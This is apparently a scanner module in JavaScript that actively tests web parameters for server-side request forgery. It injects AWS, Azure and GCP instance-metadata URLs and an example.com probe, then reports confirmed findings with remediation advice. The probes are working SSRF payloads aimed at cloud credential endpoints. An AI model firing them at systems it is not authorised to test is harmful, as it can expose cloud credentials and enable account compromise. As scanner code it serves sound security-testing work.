// Active Server-Side Request Forgery (SSRF) testing. Targets parameters that
// look like they carry URLs/hostnames and attempts to make the server fetch
// attacker-chosen internal resources (notably cloud metadata endpoints).
import { sendPayload, selectPoints, pointLabel } from '../inject.js';
import { finding } from '../finding.js';

const CAT = 'Web Application';
const MOD = 'Server-Side Request Forgery (Active)';

// Params whose names suggest they take a URL/host/path to fetch.
const URLISH = /\b(url|uri|link|src|source|dest|destination|redirect|redirect_uri|next|return|callback|webhook|fetch|load|page|file|path|image|img|avatar|feed|proxy|target|host|domain|site|api|endpoint|continue|data|reference|ref|out|go|to)\b/i;

// Internal/metadata targets whose retrieval proves SSRF.
const PROBES = [
  { url: 'http://169.254.169.254/latest/meta-data/', sig: /ami-id|instance-id|iam\/|hostname|local-ipv4|public-keys/i, label: 'AWS instance metadata (IMDSv1)' },
  { url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', sig: /compute|azEnvironment|subscriptionId/i, label: 'Azure instance metadata' },
  { url: 'http://metadata.google.internal/computeMetadata/v1/', sig: /computeMetadata|instance\/|project\//i, label: 'GCP metadata' },
];

export default {
  id: 'ssrf',
  name: 'Server-Side Request Forgery (Active)',
  category: CAT,
  default: false,
  needsCrawl: true,
  async run(ctx) {
    const surface = ctx.surface;
    if (!surface) return { findings: [] };
    const aggressive = ctx.profile === 'aggressive';
    const all = selectPoints(surface, ctx.budget?.activePoints || 60);
    // Prioritise URL-ish params; in aggressive mode test all params.
    const points = all.filter(({ param }) => URLISH.test(param));
    if (aggressive) for (const p of all) if (!points.includes(p)) points.push(p);
    if (!points.length) {
      ctx.log('SSRF: no candidate URL parameters discovered.');
      return { findings: [] };
    }

    const findings = [];
    const reported = new Set();

    for (const { point, param } of points) {
      const key = `${point.url}|${param}`;
      if (reported.has(key)) continue;
      for (const probe of PROBES) {
        const res = await sendPayload(point, param, probe.url, { timeout: 8000 });
        const body = res.ok ? res.body || '' : '';
        // Guard against reflection false-positives: if the response simply echoes
        // our payload URL back (which itself contains metadata-ish keywords), it
        // is reflection, not an actual server-side fetch. Require the signature
        // to match content that is NOT just our echoed URL.
        const reflected = body.includes(probe.url) || body.includes(encodeURIComponent(probe.url));
        if (res.ok && res.status < 400 && !reflected && probe.sig.test(body)) {
          reported.add(key);
          findings.push(
            finding({
              module: MOD, category: CAT, severity: 'critical', cvss: 9.1,
              confidence: 'confirmed',
              title: `SSRF in "${param}" — reached ${probe.label}`,
              description:
                `The \`${param}\` parameter caused the server to fetch an attacker-supplied internal URL and returned content matching ${probe.label}. This confirms Server-Side Request Forgery with access to cloud metadata — typically yielding temporary IAM credentials and full account compromise.`,
              evidence: `${pointLabel(point, param)}\nPayload: ${probe.url}\nResponse matched: ${probe.label}`,
              recommendation:
                'Enforce an allow-list of permitted hosts/schemes for server-side fetches; block link-local/metadata ranges (169.254.0.0/16) and private IPs; require IMDSv2; never fetch user-supplied URLs without validation.',
              owasp: 'A10:2021 Server-Side Request Forgery', cwe: 'CWE-918',
              references: ['https://owasp.org/www-community/attacks/Server_Side_Request_Forgery'],
            })
          );
          ctx.log(`SSRF confirmed: ${param} @ ${point.url} → ${probe.label}`, 'warn');
          break;
        }
      }
      if (reported.has(key)) continue;

      // Out-of-band-free heuristic: does the param fetch arbitrary external URLs?
      // Confirmed only when the response clearly contains our marker host's content.
      if (aggressive) {
        const probe = 'http://example.com/';
        const res = await sendPayload(point, param, probe, { timeout: 8000 });
        const body = res.ok ? res.body || '' : '';
        if (res.ok && res.status < 400 && !body.includes(probe) && /Example Domain|illustrative examples/i.test(body)) {
          reported.add(key);
          findings.push(
            finding({
              module: MOD, category: CAT, severity: 'high', cvss: 7.5,
              confidence: 'confirmed',
              title: `SSRF in "${param}" — server fetches arbitrary external URLs`,
              description: `Supplying an external URL in \`${param}\` caused the server to retrieve it and return its content (example.com's page was reflected). This is exploitable SSRF; internal services may also be reachable.`,
              evidence: `${pointLabel(point, param)}\nPayload: ${probe}\nServer returned the fetched page content.`,
              recommendation: 'Validate and allow-list outbound fetch destinations; block internal ranges; do not return fetched content to the client.',
              owasp: 'A10:2021 Server-Side Request Forgery', cwe: 'CWE-918',
            })
          );
          ctx.log(`SSRF (external fetch) confirmed: ${param} @ ${point.url}`, 'warn');
        }
      }
    }

    return { findings, info: { ssrfTested: points.length } };
  },
};
